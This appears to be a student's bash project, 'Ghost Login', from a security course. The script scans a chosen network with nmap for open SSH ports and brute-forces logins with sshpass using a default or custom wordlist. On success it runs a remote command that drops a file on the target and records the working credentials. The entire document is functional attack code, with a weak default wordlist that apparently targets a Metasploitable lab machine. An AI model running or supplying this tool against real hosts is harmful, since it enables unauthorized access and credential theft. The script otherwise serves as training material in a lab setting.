#!/bin/bash

# Project: Ghost Login
# Name: Shavit Bar
# Student Code: s19
# Class Code: TMagen773647
# Lecturer's Name: Eliran Berkovich


# Checking if the user has root privileges
if [[ $(id -u) != 0 ]]; then
    echo "Run the script as root and try again."
    exit 1
fi


# Creating an audit folder and adding timestamps for each file created
mkdir -p audit

time_stamp=$(date +'%Y-%m-%d_%H-%M-%S')


audit_file="./audit/$time_stamp.audit_file.txt"
error_audit="./audit/$time_stamp.error_file.txt"
scan_audit="./audit/$time_stamp.scan_audit.txt"
grep_scan_audit="./audit/$time_stamp.grep_scan_audit.txt"
ssh_hosts_file="./audit/$time_stamp.ssh_hosts.txt"
success_audit="./audit/$time_stamp.success.txt"

# Creating the audit files with nothing inside
touch "$audit_file"
touch "$error_audit"
touch "$scan_audit"
touch "$grep_scan_audit"
touch "$ssh_hosts_file"
touch "$success_audit"

# Checking if nmap is installed
nmap_check(){
    command -v nmap &> /dev/null
    if [[ $? -eq 0 ]]; then
        echo "nmap is installed!" >> "$audit_file"
    else
        echo "nmap is not installed, installing..." >> "$error_audit"
        apt update -y > /dev/null 2>&1 && apt install nmap -y > /dev/null 2>&1

        # Verifying if nmap installed successfully
        command -v nmap &> /dev/null

        if [[ $? -eq 0 ]]; then
            echo "nmap installed successfully" >> "$audit_file"
        else
            echo "Error: failed to install nmap, exiting..." >> "$error_audit"
            exit 1
        fi
    fi
}


# Checking if sshpass is installed
sshpass_check(){
    command -v sshpass &> /dev/null

    if [[ $? -eq 0 ]]; then
        echo "sshpass is installed!" >> "$audit_file"
    else
        echo "sshpass is not installed, installing..." >> "$error_audit"
        apt update -y > /dev/null 2>&1 && apt install sshpass -y > /dev/null 2>&1

        # Verifying if sshpass installed successfully
        command -v sshpass &> /dev/null

        if [[ $? -eq 0 ]]; then
            echo "sshpass installed successfully" >> "$audit_file"
        else
            echo "Error: failed to install sshpass, exiting..." >> "$error_audit"
            exit 1
        fi
    fi
}


# Asking the user for the target IP address or network
user_input(){
    echo "The tool will scan the network/host to find running SSH services on your target"
    echo ""
    
    while true; do
       read -p "Please Enter IP address for network or single target [192.168.80.0/24 or host 192.168.80.1]: " target_ip

        if [[ $target_ip =~ ^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(\/([0-9]|[1-2][0-9]|3[0-2]))?$ ]]; then
            echo "Your target IP address is: $target_ip" >> "$audit_file"
            break
        else
            echo "Your input is incorrect please enter a valid IP address or CIDR range"
        fi
    done
}


# Scanning the network and finding hosts with SSH running
network_scanning(){
    echo ""
    echo "Ghost Login will now start scanning your target, please wait..."
    echo ""
    echo "Scan results will be saved to: $scan_audit"
    echo ""

    # Nmap scan output is saved for the user
    nmap -p 22 -Pn -sV "$target_ip" -oN "$scan_audit" -oG "$grep_scan_audit" > /dev/null 2>&1

    # Checking if nmap completed successfully
    if [[ $? != 0 ]]; then
        echo "Error: nmap scan failed."
        echo "Nmap scan failed on target: $target_ip" >> "$error_audit"
        exit 1
    fi

    # Finding every IP address that has port 22 open
    grep "22/open" "$grep_scan_audit" | awk '{print $2}' > "$ssh_hosts_file"

    # Saving the IP addresses inside a variable
    ssh_hosts=$(cat "$ssh_hosts_file")

    # Checking if SSH hosts were found
    if [[ "$ssh_hosts" == "" ]]; then
        echo "No hosts with SSH running were found."
        echo "No SSH hosts found on target: $target_ip" >> "$error_audit"
        exit 0

    else
        echo "Hosts with SSH running:"
        echo ""

        cat "$ssh_hosts_file"
        
        echo ""
        echo "SSH hosts discovered:" >> "$audit_file"
        
        cat "$ssh_hosts_file" >> "$audit_file"
    fi
}


# Asking the user which wordlist they want to use
user_wordlist_choice(){
    echo "Please select an option to continue: (default is 1)"
    echo "1. Use default wordlist"
    echo "2. Use a wordlist you provide"
    
    while true; do
        read -p "Enter 1 or 2: " user_choice
        if [[ $user_choice = 1 || $user_choice = 2 ]]; then
            break
        else
            echo "Invalid input please try again"
        fi
    done


    # Using the built-in wordlist
    if [[ $user_choice = 1 ]]; then
        echo ""
        echo "Using default list to bruteforce SSH please wait..."
        echo ""

        default_wordlist="default_wordlist.txt"
        
        echo -e "lea\nyosi\ngaia\npass\npassword123\nmsfadmin\n123456" > "$default_wordlist"

        wordlist="$default_wordlist"

        echo "Using default wordlist" >> "$audit_file"
    else
        echo ""
        echo "Using your custom wordlist"
        echo ""

        while true; do
            read -r -p "Please enter path to wordlist: " custom_wordlist

            if [[ -f "$custom_wordlist" ]]; then
                wordlist="$custom_wordlist"
                break
            else
                echo "Wordlist does not exist, please try again."
            fi
        done
        echo "Using custom wordlist: $custom_wordlist" >> "$audit_file"
    fi
}


# Trying the credentials against every host found with SSH running
brute_force(){

    # Reading the selected wordlist
    pass_and_users=$(cat "$wordlist")

    # Trying each discovered SSH host
    for host in $ssh_hosts; do
        echo ""
        echo "Trying credentials on $host"
        echo ""

        # Checking every username and password combination
        for user in $pass_and_users; do
            for pass in $pass_and_users; do
                sshpass -p "$pass" ssh -o StrictHostKeyChecking=no "$user@$host" "exit" &> /dev/null

                # Checking if authentication was successful
                if [[ $? = 0 ]]; then
                    echo ""
                    echo "Success! valid credentials found on $host: $user : $pass" | tee -a "$audit_file"
                    echo ""

                    # Creating a file on the remote machine
                    # pwd is also executed so we know where the command ran
                    remote_path=$(sshpass -p "$pass" ssh -o StrictHostKeyChecking=no "$user@$host" "echo 'im in!!' > hello.txt && pwd" 2>> "$error_audit")

                    # Checking if the remote command worked
                    if [[ $? = 0 ]]; then
                        echo "Command executed successfully."
                        echo "File created at: $remote_path/hello.txt"
                        echo ""
                        echo "$host | User: $user | Password: $pass | File path: $remote_path/hello.txt" >> "$success_audit"
                        echo "Command successfully executed on $host" >> "$audit_file"
                        echo "File created on the remote machine at this location: $remote_path/hello.txt" >> "$audit_file"
                    else
                        echo "Login succeeded but the command failed."
                        echo "Command failed on $host using $user : $pass" >> "$error_audit"
                    fi

                    # Exit both loops
                    break 2
                else
                    echo "Could not authenticate for $host using the user and password: $user : $pass" >> "$audit_file"
                fi
            done
        done
    done
}

# Displaying the final results
final_results(){

    echo ""
    echo "Ghost Login Report"
    echo ""
    echo "Hosts found with SSH running:"
    echo ""

    cat "$ssh_hosts_file"

    echo ""
    echo "Hosts that were accessed successfully:"
    echo ""

    # Reading the successful login results
    success_results=$(cat "$success_audit")

    if [[ "$success_results" == "" ]]; then
        echo "No hosts were accessed successfully."
    else
        cat "$success_audit"
    fi

    echo ""
    echo "Files created during the process:"
    echo ""
    echo "Nmap scan:     $scan_audit"
    echo "SSH hosts:     $ssh_hosts_file"
    echo "Audit log:     $audit_file"
    echo "Error log:     $error_audit"
    echo "Success log:   $success_audit"
    echo ""
}


nmap_check
sshpass_check

echo ""
echo "============================================"
echo "                Ghost Login"
echo "============================================"
echo ""
echo "Welcome to Ghost Login, all tools are installed, enjoy!"
echo ""

user_input
network_scanning
user_wordlist_choice
brute_force
final_results
